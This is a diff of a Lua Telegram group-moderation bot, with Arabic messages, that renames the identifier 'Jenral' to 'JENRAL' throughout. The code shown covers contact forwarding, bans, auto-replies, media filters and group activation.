+DevALI:setex(JENRAL..'ALI:Start:Time'..msg.sender_user_id_,300,true)
 return false
 end 
---     Source Jenral     --
-if not SecondSudo(msg) and not DevALI:sismember(Jenral..'ALI:Ban:Pv',msg.sender_user_id_) and not DevALI:get(Jenral..'ALI:Texting:Pv') then
+--     Source JENRAL     --
+if not SecondSudo(msg) and not DevALI:sismember(JENRAL..'ALI:Ban:Pv',msg.sender_user_id_) and not DevALI:get(JENRAL..'ALI:Texting:Pv') then
 tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
 Dev_ALI(msg.sender_user_id_, msg.id_, 1, '⌁︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "GENRALTEAM")..')', 1, 'md') 
 tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
@@ -1790,13 +1790,13 @@ tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data)
 if text == 'حظر' or text == 'حضر' then
 local Text = '⌁︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⌁︙تم حظره من التواصل'
 SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
-DevALI:sadd(Jenral..'ALI:Ban:Pv',data.id_)  
+DevALI:sadd(JENRAL..'ALI:Ban:Pv',data.id_)  
 return false  
 end 
 if text == 'الغاء الحظر' or text == 'الغاء حظر' then
 local Text = '⌁︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⌁︙تم الغاء حظره من التواصل'
 SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
-DevALI:srem(Jenral..'ALI:Ban:Pv',data.id_)  
+DevALI:srem(JENRAL..'ALI:Ban:Pv',data.id_)  
 return false  
 end 
 tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
@@ -1828,30 +1828,30 @@ end,nil);
 end,nil);
 end 
 end 
---     Source Jenral     --
-if text and DevALI:get(Jenral..'ALI:Start:Bots'..msg.sender_user_id_) then
+--     Source JENRAL     --
+if text and DevALI:get(JENRAL..'ALI:Start:Bots'..msg.sender_user_id_) then
 if text == 'الغاء' then   
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الستارت', 1, 'md')
-DevALI:del(Jenral..'ALI:Start:Bots'..msg.sender_user_id_) 
+DevALI:del(JENRAL..'ALI:Start:Bots'..msg.sender_user_id_) 
 return false
 end
-DevALI:set(Jenral.."ALI:Start:Bot",text)  
+DevALI:set(JENRAL.."ALI:Start:Bot",text)  
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الستارت', 1, 'md')
-DevALI:del(Jenral..'ALI:Start:Bots'..msg.sender_user_id_) 
+DevALI:del(JENRAL..'ALI:Start:Bots'..msg.sender_user_id_) 
 return false
 end
 if SecondSudo(msg) then
 if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == '↫ تعيين رد الخاص ⌁' then 
-DevALI:set(Jenral..'ALI:Start:Bots'..msg.sender_user_id_,true) 
+DevALI:set(JENRAL..'ALI:Start:Bots'..msg.sender_user_id_,true) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي كليشة الستارت الان', 1, 'md')
 return false
 end
 if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == '↫ حذف رد الخاص ⌁' then 
-DevALI:del(Jenral..'Start:Bot') 
+DevALI:del(JENRAL..'Start:Bot') 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف كليشة الستارت بنجاح', 1, 'md')
 end
 if text == 'جلب رد الخاص' then  
-local start = DevALI:get(Jenral.."ALI:Start:Bot")
+local start = DevALI:get(JENRAL.."ALI:Start:Bot")
 if start then 
 Start_Source = start
 else
@@ -1861,17 +1861,17 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
 return false
 end
 if text == 'تفعيل التواصل' or text == '↫ تفعيل التواصل ⌁' then   
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل التواصل بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Texting:Pv') 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل التواصل بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Texting:Pv') 
 end
 if text == 'تعطيل التواصل' or text == '↫ تعطيل التواصل ⌁' then  
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل التواصل بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Texting:Pv',true) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل التواصل بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Texting:Pv',true) 
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function getUser(user_id, cb)
 tdcli_function ({
 ID = "GetUser",
@@ -1881,10 +1881,10 @@ end
 local msg = data.message_
 text = msg.content_.text_
 if msg.content_.ID == "MessageChatAddMembers" then 
-DevALI:incr(Jenral..'ALI:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
-DevALI:set(Jenral.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
+DevALI:incr(JENRAL..'ALI:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
+DevALI:set(JENRAL.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
 local mem_id = msg.content_.members_  
-local Bots = DevALI:get(Jenral.."ALI:Lock:Bots"..msg.chat_id_) 
+local Bots = DevALI:get(JENRAL.."ALI:Lock:Bots"..msg.chat_id_) 
 for i=0,#mem_id do  
 if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
 https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
@@ -1923,7 +1923,7 @@ end
 for i=0,#mem_id do  
 if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
-DevALI:sadd(Jenral..'ALI:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
 GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
 local JsonInfo = JSON.decode(GetInfo)
 if JsonInfo.ok == true and #mem_id == i then
@@ -1940,8 +1940,8 @@ end
 end  
 end  
 end
-if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(Jenral) then 
-DevALI:srem(Jenral.."ALI:Groups", msg.chat_id_) 
+if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(JENRAL) then 
+DevALI:srem(JENRAL.."ALI:Groups", msg.chat_id_) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
 local Name1 = result.first_name_
@@ -1966,18 +1966,18 @@ end,nil)
 end,nil)
 end
 if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
-if DevALI:get(Jenral..'ALI:Lock:TagServr'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:TagServr'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
 end   
 end
 if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
-DevALI:incr(Jenral..'ALI:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
+DevALI:incr(JENRAL..'ALI:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
 elseif msg.content_.ID == "MessageChatDeleteMember" then   
-DevALI:incr(Jenral..'ALI:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
+DevALI:incr(JENRAL..'ALI:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:FreeBot'..Jenral) then
+if not DevALI:get(JENRAL..'ALI:Lock:FreeBot'..JENRAL) then
 if ChatType == 'pv' then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
 return false
@@ -2007,37 +2007,37 @@ tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100"
 local admins = abbas.members_
 for i=0 , #admins do
 if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
-DevALI:sadd(Jenral..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)
+DevALI:sadd(JENRAL..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
 if ba.first_name_ == false then
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)
 end
 end,nil)   
 else
-DevALI:sadd(Jenral..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)
+DevALI:sadd(JENRAL..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)
 end
 if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
-DevALI:sadd(Jenral.."ALI:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
-DevALI:sadd(Jenral.."ALI:ALIConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevALI:sadd(JENRAL.."ALI:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevALI:sadd(JENRAL.."ALI:ALIConstructor:"..msg.chat_id_,admins[i].user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
 if ba.first_name_ == false then
-DevALI:srem(Jenral.."ALI:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
-DevALI:srem(Jenral.."ALI:ALIConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevALI:srem(JENRAL.."ALI:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevALI:srem(JENRAL.."ALI:ALIConstructor:"..msg.chat_id_,admins[i].user_id_)
 end
 end,nil)  
 end 
 end
 end,nil)
-if DevALI:sismember(Jenral..'ALI:Groups',msg.chat_id_) then
+if DevALI:sismember(JENRAL..'ALI:Groups',msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه بالتاكيد مفعله', 1, 'md')
 else
-if tonumber(data.member_count_) < tonumber(DevALI:get(Jenral..'ALI:Num:Add:Bot') or 0) and not SecondSudo(msg) then
-Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙عدد اعضاء المجموعه اقل من ↫ *'..(DevALI:get(Jenral..'ALI:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
+if tonumber(data.member_count_) < tonumber(DevALI:get(JENRAL..'ALI:Num:Add:Bot') or 0) and not SecondSudo(msg) then
+Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙عدد اعضاء المجموعه اقل من ↫ *'..(DevALI:get(JENRAL..'ALI:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
 return false
 end
 ReplyStatus(msg,result.id_,"ReplyBy","⌁︙تم تفعيل المجموعه "..dp.title_)  
-DevALI:sadd(Jenral.."ALI:Groups",msg.chat_id_)
-DevALI:sadd(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
+DevALI:sadd(JENRAL.."ALI:Groups",msg.chat_id_)
+DevALI:sadd(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
 local Name1 = result.first_name_
 local Name1 = Name1:gsub('"',"") 
 local Name1 = Name1:gsub("'","") 
@@ -2060,7 +2060,7 @@ LinkGroup = LinkGp.result
 else
 LinkGroup = 'لا يوجد'
 end
-DevALI:set(Jenral.."ALI:Groups:Links"..msg.chat_id_,LinkGroup) 
+DevALI:set(JENRAL.."ALI:Groups:Links"..msg.chat_id_,LinkGroup) 
 SendText(DevId,"⌁︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙موقعه في المجموعه ↫ "..status.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
 end
 end end
@@ -2072,29 +2072,29 @@ else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تفعيل هذه المجموعه بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
 end 
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
 print("*( OLD MESSAGE )*")
 return false
 end
---     Source Jenral     --
+--     Source JENRAL     --
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 if data.username_ ~= false then
-DevALI:set(Jenral..'Save:UserName'..msg.sender_user_id_,data.username_)
+DevALI:set(JENRAL..'Save:UserName'..msg.sender_user_id_,data.username_)
 end;end,nil) 
---     Source Jenral     --
+--     Source JENRAL     --
 local ReFalse = tostring(msg.chat_id_)
-if not DevALI:sismember(Jenral.."ALI:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
+if not DevALI:sismember(JENRAL.."ALI:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
 print("Return False : The Bot Is Not Enabled In The Group")
 return false
 end
---     Source Jenral     --
+--     Source JENRAL     --
 -------- MSG TYPES ---------
 if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
-if DevALI:get(Jenral..'ALI:Lock:Robot'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Robot'..msg.chat_id_) then
 tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
-DevALI:sadd(Jenral..'ALI:Tkeed:'..msg.chat_id_, dp.id_)
+DevALI:sadd(JENRAL..'ALI:Tkeed:'..msg.chat_id_, dp.id_)
 local Text = '⌁︙اهلا عزيزي ↫ ['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')\n⌁︙يجب علينا التأكد أنك لست روبوت\n⌁︙تم تقيدك اضغط الزر بالاسفل لفكه'
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اضغط هنا لفك تقيدك",callback_data="/UnTkeed"}}} 
@@ -2103,14 +2103,14 @@ HTTPS.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='.
 end,nil)
 return false
 end
-if DevALI:get(Jenral.."ALI:Lock:Join"..msg.chat_id_) then
+if DevALI:get(JENRAL.."ALI:Lock:Join"..msg.chat_id_) then
 ChatKick(msg.chat_id_,msg.sender_user_id_) 
 return false  
 end
 end
 if msg.content_.ID == "MessagePhoto" then
 if not Manager(msg) then 
-local filter = DevALI:smembers(Jenral.."ALI:FilterPhoto"..msg.chat_id_)
+local filter = DevALI:smembers(JENRAL.."ALI:FilterPhoto"..msg.chat_id_)
 for k,v in pairs(filter) do
 if v == msg.content_.photo_.id_ then
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙الصوره التي ارسلتها تم منعها من المجموعه")  
@@ -2122,7 +2122,7 @@ end
 end
 if msg.content_.ID == "MessageAnimation" then
 if not Manager(msg) then 
-local filter = DevALI:smembers(Jenral.."ALI:FilterAnimation"..msg.chat_id_)
+local filter = DevALI:smembers(JENRAL.."ALI:FilterAnimation"..msg.chat_id_)
 for k,v in pairs(filter) do
 if v == msg.content_.animation_.animation_.persistent_id_ then
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙المتحركه التي ارسلتها تم منعها من المجموعه")  
@@ -2134,7 +2134,7 @@ end
 end
 if msg.content_.ID == "MessageSticker" then
 if not Manager(msg) then 
-local filter = DevALI:smembers(Jenral.."ALI:FilterSteckr"..msg.chat_id_)
+local filter = DevALI:smembers(JENRAL.."ALI:FilterSteckr"..msg.chat_id_)
 for k,v in pairs(filter) do
 if v == msg.content_.sticker_.sticker_.persistent_id_ then
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙الملصق الذي ارسلته تم منعه من المجموعه")  
@@ -2144,80 +2144,80 @@ end
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^(.*)$") then
-local DelGpRedRedods = DevALI:get(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
-local GetGpTexts = DevALI:get(Jenral..'ALI:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
+local DelGpRedRedods = DevALI:get(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+local GetGpTexts = DevALI:get(JENRAL..'ALI:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
 if DelGpRedRedods == 'DelGpRedRedods' then
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
-DevALI:del(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
-DevALI:srem(Jenral..'ALI:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
+DevALI:del(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevALI:srem(JENRAL..'ALI:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
 return false
 end
 end
 if text and text:match("^(.*)$") then
-local DelGpRed = DevALI:get(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+local DelGpRed = DevALI:get(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 if DelGpRed == 'DelGpRedod' then
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
-DevALI:del(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
-DevALI:srem(Jenral..'ALI:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
+DevALI:del(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
+DevALI:srem(JENRAL..'ALI:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
 return false
 end
 end
 if text and text:match("^(.*)$") then
-local DelGpRed = DevALI:get(Jenral..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+local DelGpRed = DevALI:get(JENRAL..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
 if DelGpRed == 'DelGpRed' then
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
-DevALI:del(Jenral..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Video:GpRed'..msg.content_.text_..msg.chat_id_)
-DevALI:del(Jenral..'ALI:File:GpRed'..msg.content_.text_..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Text:GpRed'..msg.content_.text_..msg.chat_id_)
-DevALI:srem(Jenral..'ALI:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
+DevALI:del(JENRAL..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Video:GpRed'..msg.content_.text_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:File:GpRed'..msg.content_.text_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Text:GpRed'..msg.content_.text_..msg.chat_id_)
+DevALI:srem(JENRAL..'ALI:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
 return false
 end
 end
 if text and text:match("^(.*)$") then
-local DelAllRed = DevALI:get(Jenral.."ALI:Add:AllRed"..msg.sender_user_id_)
+local DelAllRed = DevALI:get(JENRAL.."ALI:Add:AllRed"..msg.sender_user_id_)
 if DelAllRed == 'DelAllRed' then
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
-DevALI:del(Jenral.."ALI:Add:AllRed"..msg.sender_user_id_)
-DevALI:del(Jenral.."ALI:Gif:AllRed"..msg.content_.text_)
-DevALI:del(Jenral.."ALI:Voice:AllRed"..msg.content_.text_)
-DevALI:del(Jenral.."ALI:Audio:AllRed"..msg.content_.text_)
-DevALI:del(Jenral.."ALI:Photo:AllRed"..msg.content_.text_)
-DevALI:del(Jenral.."ALI:Stecker:AllRed"..msg.content_.text_)
-DevALI:del(Jenral.."ALI:Video:AllRed"..msg.content_.text_)
-DevALI:del(Jenral.."ALI:File:AllRed"..msg.content_.text_)
-DevALI:del(Jenral.."ALI:Text:AllRed"..msg.content_.text_)
-DevALI:del(Jenral.."ALI:Sudo:AllRed",msg.content_.text_)
+DevALI:del(JENRAL.."ALI:Add:AllRed"..msg.sender_user_id_)
+DevALI:del(JENRAL.."ALI:Gif:AllRed"..msg.content_.text_)
+DevALI:del(JENRAL.."ALI:Voice:AllRed"..msg.content_.text_)
+DevALI:del(JENRAL.."ALI:Audio:AllRed"..msg.content_.text_)
+DevALI:del(JENRAL.."ALI:Photo:AllRed"..msg.content_.text_)
+DevALI:del(JENRAL.."ALI:Stecker:AllRed"..msg.content_.text_)
+DevALI:del(JENRAL.."ALI:Video:AllRed"..msg.content_.text_)
+DevALI:del(JENRAL.."ALI:File:AllRed"..msg.content_.text_)
+DevALI:del(JENRAL.."ALI:Text:AllRed"..msg.content_.text_)
+DevALI:del(JENRAL.."ALI:Sudo:AllRed",msg.content_.text_)
 return false
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^(.*)$") then
-local SaveGpRedod = DevALI:get(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+local SaveGpRedod = DevALI:get(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 if SaveGpRedod == 'SaveGpRedod' then
-local GetGpTexts = DevALI:get(Jenral..'ALI:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
-local List = DevALI:smembers(Jenral..'ALI:Text:GpTexts'..GetGpTexts..msg.chat_id_)
+local GetGpTexts = DevALI:get(JENRAL..'ALI:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'ALI:Text:GpTexts'..GetGpTexts..msg.chat_id_)
 if text == "الغاء" then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙⌁︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
-DevALI:del(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Text:GpTexts'..GetGpTexts..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
-DevALI:srem(Jenral..'ALI:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
+DevALI:del(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Text:GpTexts'..GetGpTexts..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
+DevALI:srem(JENRAL..'ALI:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
 return false
 end
 Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
-DevALI:sadd(Jenral..'ALI:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
+DevALI:sadd(JENRAL..'ALI:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
 if #List == 4 then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ ↫ 5 من الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
-DevALI:del(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 return false
 end
 local ALI = "⌁︙تم حفظ الرد رقم ↫ "..(#List+1).."\n⌁︙قم بارسال الرد رقم ↫ "..(#List+2)
@@ -2228,36 +2228,36 @@ https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='.
 return false
 end
 end
-if text and not DevALI:get(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
-if DevALI:sismember(Jenral..'ALI:Manager:GpRedod'..msg.chat_id_,text) then
-local JenralTEAM =  DevALI:smembers(Jenral..'ALI:Text:GpTexts'..text..msg.chat_id_)
-Dev_ALI(msg.chat_id_, msg.id_, 1, '['..JenralTEAM[math.random(#JenralTEAM)]..']' , 1, 'md')  
+if text and not DevALI:get(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
+if DevALI:sismember(JENRAL..'ALI:Manager:GpRedod'..msg.chat_id_,text) then
+local JENRALTEAM =  DevALI:smembers(JENRAL..'ALI:Text:GpTexts'..text..msg.chat_id_)
+Dev_ALI(msg.chat_id_, msg.id_, 1, '['..JENRALTEAM[math.random(#JENRALTEAM)]..']' , 1, 'md')  
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
-local SaveGpRed = DevALI:get(Jenral..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+local SaveGpRed = DevALI:get(JENRAL..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
 if SaveGpRed == 'SaveGpRed' then 
 if text == 'الغاء' then
-local DelManagerRep = DevALI:get(Jenral..'DelManagerRep'..msg.chat_id_)
-DevALI:srem(Jenral..'ALI:Manager:GpRed'..msg.chat_id_,DelManagerRep)
+local DelManagerRep = DevALI:get(JENRAL..'DelManagerRep'..msg.chat_id_)
+DevALI:srem(JENRAL..'ALI:Manager:GpRed'..msg.chat_id_,DelManagerRep)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ الرد', 1, 'md')
-DevALI:del(Jenral..'ALI:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
-DevALI:del(Jenral..'DelManagerRep'..msg.chat_id_)
